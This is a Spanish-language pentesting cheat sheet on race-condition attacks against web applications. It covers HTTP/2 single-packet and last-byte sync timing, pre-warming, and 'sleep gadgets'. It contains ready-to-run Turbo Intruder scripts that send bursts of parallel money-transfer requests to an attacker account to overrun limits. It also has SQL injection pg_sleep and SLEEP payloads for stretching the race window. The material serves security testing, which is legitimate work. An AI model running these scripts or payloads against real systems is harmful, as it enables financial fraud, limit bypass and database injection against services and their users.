---
aliases:
  - Single-Packet Attack
  - Last-Byte Sync
  - HTTP/2 Race
tags:
  - type/cheatsheet
  - vuln/race-condition
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Race Conditions]]'
---
# Race Conditions - Single-Packet Attack

***

## HTTP/2 Single-Packet Technique

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | HTTP/2 multiplexes streams en un solo TCP packet. N requests llegan al server simultáneamente — bypassea network jitter. | James Kettle 2023 paper. |
| Setup | Cliente HTTP/2 + server con HTTP/2 support | Cloudflare/AWS ALB típicamente. |
| Última frame coordinada | Mandar headers de N requests → hold last DATA frame → flush all juntos | Single-packet sync. |
| Turbo Intruder support | Built-in flag `engine=Engine.BURP2` o `concurrentConnections=1` | Tool nativo. |
| Resultado | Window de ms → all N requests procesados quasi-simultáneamente | Race window minimal. |
| Limitación | Solo HTTP/2 endpoints | Si server H1 only → fallback. |
| Validation | Latency baseline vs concurrent run | Si concurrent latency ~= 1 request → packet único. |
| Burp Repeater H2 mode | "Send group → in single connection" + tab "HTTP/2" | UI alternative. |
| Sleep gadget canary | Inject sleep 5s en single request, race gate antes que sleep complete | Confirm window. |
| Best for | Limit overrun, OTP brute, state machine race | Most common usage. |
^race-single-h2

### Turbo Intruder script HTTP/2 single-packet

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)  # HTTP/2 single-packet
    
    req = '''POST /api/transfer HTTP/2
host: target.com
content-type: application/json
cookie: session=...
content-length: 50

{"to":"attacker","amount":1000}'''
    
    for _ in range(20):
        engine.queue(req)

def handleResponse(req, interesting):
    table.add(req)
```

___

## Last-Byte Sync (HTTP/1.1)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | HTTP/1.1 sin H2 — pre-load todos los requests excepto last byte, luego flush último byte de cada uno juntos | Pre-H2 técnica. |
| Pipelining + delay | Send headers + N-1 bytes del body → hold last byte → flush juntos | Manual. |
| Connection reuse | Single TCP connection con pipelining | RFC 2616. |
| Limitación | Server debe soportar pipelining (HTTP/1.1 keep-alive) | Most do. |
| Server processing | Server holds requests hasta complete | Que no cierre conn. |
| Network jitter | Bytes flush juntos → minimiza jitter | Vs network-level race. |
| Tooling | Turbo Intruder con `engine=Engine.THREADED` + custom timing | Implementable. |
| Burp Repeater | "Send group → single connection" funciona aproximadamente | Less precise. |
| Best for | Targets HTTP/1.1 only, internal apps, legacy | Legacy. |
| Modern alternative | Si target tiene H2 → preferir H2 single-packet | Better timing. |
^race-single-lastbyte

___

## Pre-Loading Delays

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Pre-warm server (caches, connections, JIT) antes del race burst | Reduce variability. |
| Warm cache | Send 1 normal request antes → cache populated | Más predictable. |
| Establish TLS | TLS handshake antes del burst | Reduce jitter. |
| Pool DB connections | Trigger DB lookup antes → connection in pool | Backend pre-warm. |
| Burp option "Pre-warm connection" | Built-in en Turbo Intruder | Auto. |
| Sleep buffer | Wait 100ms entre warm y burst | Network stability. |
| Multi-stage | Warm in stage 1 + race in stage 2 | Phased. |
| Cold start avoid | Si serverless (Lambda) → invoke once before | Avoid cold start. |
| TCP slow start avoid | TCP cwnd grow → mejor con keep-alive | Network. |
| TLS session reuse | TLS resume reduces handshake | Speed. |
^race-single-prewarm

___

## Sleep Gadget Probe

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Si no estás seguro de race window — inject sleep en endpoint via SQLi/SSRF/etc. Sleep extiende processing time → race window enlargada artificialmente | Side-channel. |
| SQLi sleep | `' OR pg_sleep(5) -- -` en arg vulnerable | Postgres. |
| SQLi MySQL | `' OR SLEEP(5) -- -` | MySQL. |
| SSRF sleep | SSRF a slow endpoint propio | Custom. |
| External fetch sleep | App fetch external URL → atacante sirve slow response | Tarpit. |
| File operation sleep | Upload large file → processing slow | Inherent. |
| Image resize sleep | Big image triggers slow resize | Same. |
| Confirm race exists | Sin sleep gadget no race observed → con sleep race confirmed | Validates timing-sensitivity. |
| Tunear timing window | Adjust sleep duration → identify min window required | Calibration. |
| Race condition development | Develop race exploit con large window first → minify después | Iterative. |
^race-single-sleep

### Workflow combine sleep gadget + race

```python
# Probe with sleep gadget
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)

    # Request 1: trigger sleep via SQLi en endpoint vulnerable
    sleep_req = '''GET /search?q=AAA' OR pg_sleep(5)-- - HTTP/2
host: target.com

'''
    
    # Request 2: race con limit overrun
    race_req = '''POST /api/transfer HTTP/2
host: target.com
content-type: application/json

{"to":"attacker","amount":1000}'''
    
    # Send sleep first → race during sleep window
    engine.queue(sleep_req)
    for _ in range(10):
        engine.queue(race_req)
```

***
